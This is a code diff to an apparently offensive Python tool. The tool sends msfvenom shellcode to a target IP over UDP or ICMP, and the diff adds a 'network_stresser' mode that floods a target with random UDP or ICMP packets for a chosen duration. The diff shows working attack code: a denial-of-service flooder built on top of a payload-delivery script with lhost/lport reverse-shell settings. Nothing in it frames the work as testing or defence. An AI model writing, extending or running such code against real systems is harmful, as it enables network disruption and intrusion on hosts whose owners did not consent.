@@ -33,8 +33,21 @@ def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
             print(f"An error occurred: {e}")
             break
 
+def network_stresser(target_ip, target_port, duration, protocol):
+    end_time = time.time() + duration
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = os.urandom(1024)  # Random payload of 1024 bytes
+    while time.time() < end_time:
+        if protocol == 'udp':
+            sock.sendto(packet, (target_ip, target_port))
+        elif protocol == 'icmp':
+            pkt = IP(dst=target_ip)/ICMP()/Raw(load=packet)
+            send(pkt, verbose=False)
+        print(f"Stressing {protocol.upper()} to {target_ip}:{target_port}")
+    sock.close()
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Send shellcode via UDP or ICMP packets.')
+    parser = argparse.ArgumentParser(description='Send shellcode via UDP or ICMP packets or stress network.')
     parser.add_argument('--target_ip', type=str, required=True, help='The target IP address')
     parser.add_argument('--target_port', type=int, help='The target port (for UDP)')
     parser.add_argument('--num_packets', type=int, default=10, help='Number of packets to send')
@@ -43,15 +56,22 @@ if __name__ == "__main__":
     parser.add_argument('--lhost', type=str, default='127.0.0.1', help='Local host for msfvenom payload')
     parser.add_argument('--lport', type=int, default=4444, help='Local port for msfvenom payload')
     parser.add_argument('--protocol', type=str, choices=['udp', 'icmp'], default='udp', help='Protocol to use for sending packets')
+    parser.add_argument('--stresser', action='store_true', help='Enable network stresser mode')
+    parser.add_argument('--duration', type=int, default=60, help='Duration for network stresser mode in seconds')
 
     args = parser.parse_args()
 
-    shellcode = generate_shellcode(args.payload, args.lhost, args.lport)
-
-    if args.protocol == 'udp':
+    if args.stresser:
         if not args.target_port:
-            print("Target port is required for UDP protocol.")
+            print("Target port is required for UDP protocol in stresser mode.")
         else:
-            send_shellcode_via_udp(shellcode, args.target_ip, args.target_port, args.num_packets, args.burst_interval)
-    elif args.protocol == 'icmp':
-        send_shellcode_via_icmp(shellcode, args.target_ip, args.num_packets, args.burst_interval)
+            network_stresser(args.target_ip, args.target_port, args.duration, args.protocol)
+    else:
+        shellcode = generate_shellcode(args.payload, args.lhost, args.lport)
+        if args.protocol == 'udp':
+            if not args.target_port:
+                print("Target port is required for UDP protocol.")
+            else:
+                send_shellcode_via_udp(shellcode, args.target_ip, args.target_port, args.num_packets, args.burst_interval)
+        elif args.protocol == 'icmp':
+            send_shellcode_via_icmp(shellcode, args.target_ip, args.num_packets, args.burst_interval)
